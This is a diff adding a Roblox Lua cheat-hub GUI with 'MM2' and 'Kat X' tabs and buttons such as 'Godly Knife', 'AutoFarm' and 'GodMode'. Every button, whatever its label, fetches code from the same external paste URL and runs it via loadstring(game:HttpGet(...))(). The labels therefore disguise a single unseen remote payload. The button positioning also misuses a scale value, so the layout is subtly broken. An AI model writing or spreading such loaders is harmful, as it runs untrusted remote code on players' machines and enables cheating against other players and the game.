@@ -1,0 +1,78 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- Main GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "GameScriptHub"
+ScreenGui.Parent = PlayerGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 350, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
+MainFrame.Parent = ScreenGui
+
+-- Tabs
+local MM2Tab = Instance.new("TextButton")
+MM2Tab.Text = "MM2"
+MM2Tab.Size = UDim2.new(0, 100, 0, 40)
+MM2Tab.Position = UDim2.new(0, 0, 0, 0)
+MM2Tab.Parent = MainFrame
+
+local KatXTab = Instance.new("TextButton")
+KatXTab.Text = "Kat X"
+KatXTab.Size = UDim2.new(0, 100, 0, 40)
+KatXTab.Position = UDim2.new(0, 110, 0, 0)
+KatXTab.Parent = MainFrame
+
+-- Buttons container
+local ButtonsFrame = Instance.new("Frame")
+ButtonsFrame.Size = UDim2.new(1, -20, 1, -60)
+ButtonsFrame.Position = UDim2.new(0, 10, 0, 50)
+ButtonsFrame.BackgroundTransparency = 1
+ButtonsFrame.Parent = MainFrame
+
+-- Table to store buttons
+local buttons = {}
+
+-- Function to create buttons
+local function CreateButton(name)
+    local btn = Instance.new("TextButton")
+    btn.Text = name
+    btn.Size = UDim2.new(0, 200, 0, 50)
+    btn.Position = UDim2.new(0.5, -100, #buttons * 60, 0)
+    btn.Parent = ButtonsFrame
+    btn.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://paste.debian.net/plainh/0f441c13/", true))()
+    end)
+    table.insert(buttons, btn)
+end
+
+-- MM2 Buttons
+local MM2Buttons = {"Godly Knife", "Teleport Knife"}
+-- Kat X Buttons
+local KatXButtons = {"AutoFarm", "GodMode"}
+
+-- Function to show buttons
+local function ShowButtons(list)
+    for i, btn in ipairs(buttons) do
+        btn:Destroy()
+    end
+    buttons = {}
+    for _, name in ipairs(list) do
+        CreateButton(name)
+    end
+end
+
+-- Connect tabs
+MM2Tab.MouseButton1Click:Connect(function()
+    ShowButtons(MM2Buttons)
+end)
+
+KatXTab.MouseButton1Click:Connect(function()
+    ShowButtons(KatXButtons)
+end)
+
+-- Show MM2 buttons by default
+ShowButtons(MM2Buttons)
